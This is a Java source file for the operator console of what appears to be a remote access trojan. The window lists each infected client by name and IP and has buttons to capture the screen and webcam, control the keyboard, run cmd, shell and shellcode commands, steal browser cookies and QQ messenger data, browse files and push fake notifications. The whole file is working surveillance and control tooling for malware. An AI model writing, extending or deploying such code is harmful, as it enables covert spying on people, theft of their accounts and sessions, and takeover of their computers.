package server.connection;

import server.features.FileManagerUI;
import server.utils.ID;

import javax.swing.*;
import javax.swing.text.DefaultCaret;
import java.awt.*;
import java.awt.event.ActionListener;
import java.util.function.Consumer;

public class ClientRemoteUI extends JFrame {
    private boolean isSharingScreen = false;
    private boolean isSharingCamera = false;
    public JTextArea textArea;
    private final ClientConnection client;
    private final String clientName;
    private final String clientIp;

    public ClientRemoteUI(ClientConnection client, String clientName, String clientIp) {
        this.client = client;
        this.clientName = clientName;
        this.clientIp = clientIp;
        initializeUI();
    }

    private void initializeUI() {
        setTitle("Client Remote Interface: " + clientName + " (" + clientIp + ")");
        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        setSize(800, 600);
        setLayout(new BorderLayout(10, 10));

        setupTextArea();
        setupButtonPanel();

        pack();
        setLocationRelativeTo(null);
    }

    private void setupTextArea() {
        textArea = new JTextArea(20, 60);
        textArea.setEditable(false);
        textArea.setFont(new Font("Monospaced", Font.PLAIN, 12));
        JScrollPane scrollPane = new JScrollPane(textArea);
        scrollPane.setBorder(BorderFactory.createTitledBorder("Client Log"));

        DefaultCaret caret = (DefaultCaret) textArea.getCaret();
        caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);

        appendToLog("Welcome to the remote interface of " + clientName + ".");
        appendToLog("You are connected to the client with IP address: " + clientIp + ".");

        add(scrollPane, BorderLayout.CENTER);
    }

    private void setupButtonPanel() {
        JPanel buttonPanel = new JPanel(new GridLayout(4, 3, 10, 10));
        buttonPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        addButton(buttonPanel, "Screen", e -> toggleSharing("Screen", "startScreen", "stopScreen", () -> isSharingScreen, b -> isSharingScreen = b, client.screenSharingServer::startReceivingScreens, client.screenSharingServer::stopReceivingScreens));
        addButton(buttonPanel, "Camera", e -> toggleSharing("Camera", "startCamera", "stopCamera", () -> isSharingCamera, b -> isSharingCamera = b, client.cameraServer::startReceivingCamera, client.cameraServer::stopReceivingCamera));
        addButton(buttonPanel, "Keyboard", e -> toggleKeyboard());
        addButton(buttonPanel, "Command Prompt", e -> sendCommand("cmd"));
        addButton(buttonPanel, "Shell", e -> sendCommand("shell"));
        addButton(buttonPanel, "Shellcode", e -> sendCommand("shellcode"));
        addButton(buttonPanel, "Notification", e -> sendNotification());
        addButton(buttonPanel, "Get Cookies", e -> sendSimpleCommand("getCookie"));
        addButton(buttonPanel, "Get QQ Data", e -> sendSimpleCommand("getQQData"));
        addButton(buttonPanel, "File Manager", e -> openFileManager());
        addButton(buttonPanel, "Remove Client", e -> removeClient());

        add(buttonPanel, BorderLayout.SOUTH);
    }

    private void addButton(JPanel panel, String label, ActionListener listener) {
        JButton button = new JButton(label);
        button.addActionListener(listener);
        panel.add(button);
    }

    private void toggleSharing(String featureName, String startCommand, String stopCommand, BooleanSupplier isSharing, Consumer<Boolean> setSharingState, Runnable startAction, Runnable stopAction) {
        try {
            if (!isSharing.getAsBoolean()) {
                startAction.run();
                client.sendCommand(startCommand);
                appendToLog(featureName + " sharing started.");
            } else {
                stopAction.run();
                client.sendCommand(stopCommand);
                appendToLog(featureName + " sharing stopped.");
            }
            setSharingState.accept(!isSharing.getAsBoolean());
        } catch (Exception ex) {
            handleException("Error toggling " + featureName + " sharing", ex);
        }
    }

    private void toggleKeyboard() {
        try {
            sendHead(ID.KEYBOARD());
            client.keyboardServer.startReceivingKey();
            appendToLog("Keyboard control activated.");
        } catch (Exception ex) {
            handleException("Error toggling keyboard control", ex);
        }
    }

    private void sendSimpleCommand(String command) {
        try {
            client.sendCommand(command);
            appendToLog("Sent command: " + command);
        } catch (Exception ex) {
            handleException("Error sending command: " + command, ex);
        }
    }

    private void openFileManager() {
        FileManagerUI fileManager = client.fileManagerUI;
        fileManager.setVisible(true);
        try {
            client.sendMessage(ID.FILE_DIR(), "");
        } catch (Exception ex) {
            handleException("Error opening file manager", ex);
        }
    }

    private void sendCommand(String commandPrefix) {
        String input = JOptionPane.showInputDialog(this, "Enter command:", "Send " + commandPrefix + " Command", JOptionPane.QUESTION_MESSAGE);
        if (input != null && !input.trim().isEmpty()) {
            try {
                String fullCommand = commandPrefix + ":" + input.trim();
                client.sendCommand(fullCommand);
                appendToLog("Sent command: " + fullCommand);
            } catch (Exception ex) {
                handleException("Error sending command", ex);
            }
        }
    }

    private void sendNotification() {
        JPanel panel = new JPanel(new GridLayout(0, 1, 5, 5));
        JComboBox<String> typeCombo = new JComboBox<>(new String[]{"Button (May not be on top)", "Windows"});
        JTextField titleField = new JTextField(20);
        JTextField messageField = new JTextField(20);

        panel.add(new JLabel("Notification Type:"));
        panel.add(typeCombo);
        panel.add(new JLabel("Title:"));
        panel.add(titleField);
        panel.add(new JLabel("Message:"));
        panel.add(messageField);

        int result = JOptionPane.showConfirmDialog(this, panel, "Send Notification", JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);
        if (result == JOptionPane.OK_OPTION) {
            String type = typeCombo.getSelectedIndex() == 0 ? "buttonNotification" : "notification";
            String title = titleField.getText().trim();
            String message = messageField.getText().trim();

            if (!title.isEmpty() && !message.isEmpty()) {
                try {
                    String command = type + ":" + title + "/:split/" + message;
                    client.sendCommand(command);
                    appendToLog("Sent notification: " + type + " - " + title);
                } catch (Exception ex) {
                    handleException("Error sending notification", ex);
                }
            } else {
                JOptionPane.showMessageDialog(this, "Title and message cannot be empty.", "Invalid Input", JOptionPane.ERROR_MESSAGE);
            }
        }
    }

    private void removeClient() {
        int confirm = JOptionPane.showConfirmDialog(this, "Are you sure you want to remove this client?", "Confirm Removal", JOptionPane.YES_NO_OPTION, JOptionPane.WARNING_MESSAGE);
        if (confirm == JOptionPane.YES_OPTION) {
            try {
                client.sendMessage(ID.COMMAND(), "relieveClient");
                appendToLog("Client removal requested.");
                dispose();
            } catch (Exception ex) {
                handleException("Error removing client", ex);
            }
        }
    }

    private void sendHead(int headCommand) throws Exception {
        client.sendHead(headCommand);
    }

    private void appendToLog(String message) {
        SwingUtilities.invokeLater(() -> {
            textArea.append(message + "\n");
            textArea.setCaretPosition(textArea.getDocument().getLength());
        });
    }

    private void handleException(String message, Exception ex) {
        appendToLog("Error: " + message);
        ex.printStackTrace();
        JOptionPane.showMessageDialog(this, message + ": " + ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
    }

    @FunctionalInterface
    private interface BooleanSupplier {
        boolean getAsBoolean();
    }
}